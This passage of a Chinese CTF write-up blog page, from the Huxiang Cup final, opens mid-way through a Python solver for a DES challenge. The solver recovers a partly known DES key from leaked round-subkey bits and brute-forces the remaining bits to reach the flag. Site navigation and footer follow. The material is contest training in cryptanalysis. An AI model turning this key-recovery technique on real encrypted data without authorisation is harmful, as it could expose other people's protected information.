key1[i]</span><br><span class="line"><span class="comment"># print "C1: "+"".join(C1D1)[:28]</span></span><br><span class="line"><span class="comment"># print "D1: "+"".join(C1D1)[28:]</span></span><br><span class="line"></span><br><span class="line">C0 = <span class="string">'000000001*11111100*110*00*00'</span></span><br><span class="line">D0 = <span class="string">'1011001*01*1101*0001011000*0'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">         <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">         ]</span><br><span class="line">C0D0 = C0+D0</span><br><span class="line">res = [<span class="string">'*'</span>]*<span class="number">64</span></span><br><span class="line">deskey = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(__pc1)):</span><br><span class="line">    res[__pc1[i]] = C0D0[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    deskey += i</span><br><span class="line"><span class="comment"># print deskey</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#deskey: 01000***01**111*0100100*0110010*0110111*01*00*1*0*0*010*0100001*</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zuoyiwei</span><span class="params">(str,num)</span>:</span></span><br><span class="line">    my = str[num:len(str)]</span><br><span class="line">    my = my+str[<span class="number">0</span>:num]</span><br><span class="line">    <span class="keyword">return</span> my</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_1</span><span class="params">(str)</span>:</span></span><br><span class="line">    key1_list = [<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key1_list:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_2</span><span class="params">(str)</span>:</span></span><br><span class="line">    key2_list = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key2_list:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span><span class="params">(str)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    key_change_res = key_change_1(str)</span><br><span class="line">    key_c = key_change_res[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d = key_change_res[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) <span class="keyword">or</span> (i==<span class="number">2</span>) <span class="keyword">or</span> (i==<span class="number">9</span>) <span class="keyword">or</span> (i==<span class="number">16</span>):</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">1</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">2</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">2</span>)</span><br><span class="line">        key_yiwei = key_c+key_d</span><br><span class="line">        key_res = key_change_2(key_yiwei)</span><br><span class="line">        key_list.append(key_res)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line">key = <span class="string">"01000abc01de111f0100100g0110010h0110111i01j00k1l0m0n010o0100001p"</span></span><br><span class="line"><span class="comment"># print key_gen(key)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">unknow = [<span class="string">'101000001001011001000110001110110000011110011000'</span>,</span><br><span class="line">          <span class="string">'1j1n000000d101100m010010100k011000110110be1a0110'</span>,</span><br><span class="line">          <span class="string">'01100100jm010d10011100000011110ae00010111110010b'</span>,</span><br><span class="line">          <span class="string">'1d0001101101000m01010nj0000100b011k01e0011010011'</span>,</span><br><span class="line">          <span class="string">'00j01110d10000110101001m01k0e1111010010b00010a01'</span>,</span><br><span class="line">          <span class="string">'0010111m0101000100n010d1101010110e100101a10010k0'</span>,</span><br><span class="line">          <span class="string">'n0d0101100000001m10j10010b101k00110100110000011a'</span>,</span><br><span class="line">          <span class="string">'000m1j01010010n010011001e10101a0010001001k10b110'</span>,</span><br><span class="line">          <span class="string">'00n111010100m00j1d0010000k00000e11111b01010101a0'</span>,</span><br><span class="line">          <span class="string">'000100100dm010011000110j0110ba01101001001011k000'</span>,</span><br><span class="line">          <span class="string">'0001100j00101m0d000n0101111010010b0k11000a001e11'</span>,</span><br><span class="line">          <span class="string">'0m000n0100101100j010110d00001110a1010010e0k11110'</span>,</span><br><span class="line">          <span class="string">'110j00ndm010010010100100b00101010101ka011110010e'</span>,</span><br><span class="line">          <span class="string">'1101n00010001110d01000m01000a0e0100010b0111k0001'</span>,</span><br><span class="line">          <span class="string">'11md0000101100100010nj10110b001k1a10111e00010101'</span>,</span><br><span class="line">          <span class="string">'10100000101mdj10n010011010100e011001a0k000001b11'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># def check(s):</span></span><br><span class="line"><span class="comment">#     count = 0</span></span><br><span class="line"><span class="comment">#     ini = 1</span></span><br><span class="line"><span class="comment">#     for i in range(16):</span></span><br><span class="line"><span class="comment">#         if s in unknow[i]:</span></span><br><span class="line"><span class="comment">#             count += 1</span></span><br><span class="line"><span class="comment">#             try:</span></span><br><span class="line"><span class="comment">#                 assert Kn[i][unknow[i].index(s)] == "1"</span></span><br><span class="line"><span class="comment">#             except:</span></span><br><span class="line"><span class="comment">#                 ini = 0</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#     if count == 0:</span></span><br><span class="line"><span class="comment">#         print s + ":unknow"</span></span><br><span class="line"><span class="comment">#     elif ini == 1:</span></span><br><span class="line"><span class="comment">#         print s + ":1"</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         print s + ":0"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for x in "abcdefghijklmnop":</span></span><br><span class="line"><span class="comment">#     check(x)</span></span><br><span class="line"></span><br><span class="line">undeskey = <span class="string">"0100000c0110111f0100100g0110010h0110111i0110011l0100010o0100001p"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bintostr</span><span class="params">(str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str),<span class="number">8</span>):</span><br><span class="line">        res += chr(int(str[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">                        <span class="keyword">for</span> o <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">                            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="string">"01"</span>:</span><br><span class="line">                                deskey = <span class="string">"0100000"</span>+c+<span class="string">"0110111"</span>+f+<span class="string">"0100100"</span>+g+<span class="string">"0110010"</span>+h+<span class="string">"0110111"</span>+i+<span class="string">"0110011"</span>+l+<span class="string">"0100010"</span>+o+<span class="string">"0100001"</span>+p</span><br><span class="line">                                deskey = bintostr(deskey)</span><br><span class="line">                                <span class="keyword">print</span> deskey</span><br></pre></td></tr></table></figure>
+
+<p>得到无数个key，并且解密的结果都相同，最后在key中找到AnHengDB， 拼接得到flag</p>
+<p><img src="../../../../img/hxb/h4.png" alt="h4"></p>
+<h3 id="决赛感悟"><a href="#决赛感悟" class="headerlink" title="决赛感悟"></a>决赛感悟</h3><p>第一次打湖湘杯决赛，长沙的食物太辣了，天气也很冷，住的挺好，但是起床时间太早了，俺就是一名网络水军。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/03/2019上海大学生网络安全大赛/" rel="next" title="2019上海大学生网络安全大赛">
+                <i class="fa fa-chevron-left"></i> 2019上海大学生网络安全大赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/10/2019红帽杯/" rel="prev" title="2019红帽杯">
+                2019红帽杯 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Glarcy">
+            
+              <p class="site-author-name" itemprop="name">Glarcy</p>
+              <p class="site-description motion-element" itemprop="description">web小菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#untar"><span class="nav-number">2.1.</span> <span class="nav-text">untar</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Thinkphp"><span class="nav-number">2.2.</span> <span class="nav-text">Thinkphp?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#give-me-your-passport"><span class="nav-number">3.1.</span> <span class="nav-text">give me your passport</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Rsa"><span class="nav-number">3.2.</span> <span class="nav-text">Rsa</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Des"><span class="nav-number">3.3.</span> <span class="nav-text">Des</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#决赛感悟"><span class="nav-number">4.</span> <span class="nav-text">决赛感悟</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glarcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
